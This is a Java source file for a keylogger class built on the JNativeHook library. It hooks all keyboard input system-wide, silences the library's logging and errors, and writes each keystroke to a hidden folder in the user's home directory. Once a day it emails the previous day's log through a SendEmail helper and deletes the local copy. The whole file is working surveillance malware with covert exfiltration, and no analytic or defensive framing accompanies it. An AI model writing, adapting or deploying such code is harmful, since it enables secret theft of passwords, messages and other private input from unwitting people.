import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class KeyLogger implements NativeKeyListener 
{
  private String logPath;
  DummyDate init;

  public KeyLogger()
  {
    init = new DummyDate();
    if ( System.getProperty("os.name").toLowerCase().startsWith("windows") )
    {
      logPath = System.getProperty("user.home") + File.separator + "AppData" + File.separator + "kl";
    }
    else
    {
      logPath = System.getProperty("user.home").toLowerCase() + File.separator + ".kl";
    }
  }
  
  public static void main(String[] args) throws InterruptedException 
  {
    
    Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
    logger.setLevel(Level.OFF);

    try 
    {
      GlobalScreen.registerNativeHook();
    } 
    catch (NativeHookException ex) 
    {
      //System.err.println(ex.getMessage());
      System.exit(1);
    }

    NativeKeyEvent ev = new NativeKeyEvent(
        NativeKeyEvent.NATIVE_KEY_PRESSED,
        System.currentTimeMillis(),
        0x00,
        0x00,
        NativeKeyEvent.VC_MEDIA_PLAY,
        NativeKeyEvent.CHAR_UNDEFINED,
        NativeKeyEvent.KEY_LOCATION_STANDARD);

    GlobalScreen.addNativeKeyListener(new KeyLogger ());

    GlobalScreen.postNativeEvent(ev);
  }

  public void nativeKeyPressed(NativeKeyEvent e) 
  {
    if ( e.getKeyCode() == 57378)
    {
      return;
    }
    else
    {
      DummyDate now = new DummyDate();
      /* NEW DAY */
      if ( init.compareTo(now) != 1 )
      {
        File logdir = new File(logPath);
        File [] flist = logdir.listFiles();
        File send = null;
        for ( File f : flist)
        {
          if ( f.getAbsolutePath().toLowerCase().contains(init.toString()))
          {
            send = new File(f.getAbsolutePath());
          }
        }
        if ( send != null)
        { 
          SendEmail mail = new SendEmail();
          if ( mail.send(send.getAbsolutePath()) )
          {
            send.delete();
          }
        }
      }

      BufferedWriter bw = null;
      try
      {
        bw = new BufferedWriter(new FileWriter(logPath + File.separator 
           + "key.log" + now.toString() , true));
        bw.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
        bw.flush();
      }
      catch ( IOException ex)
      {
        //System.err.println(ex.getMessage());
      }
      finally
      {
        if ( bw != null)
        {
          try 
          {
            bw.close();
          }
          catch ( IOException ex)
          {

          }
        }
        init.updateTime();
      }
    }
  }

  public void nativeKeyReleased(NativeKeyEvent e) 
  {

  }

  public void nativeKeyTyped(NativeKeyEvent e) {

  }
}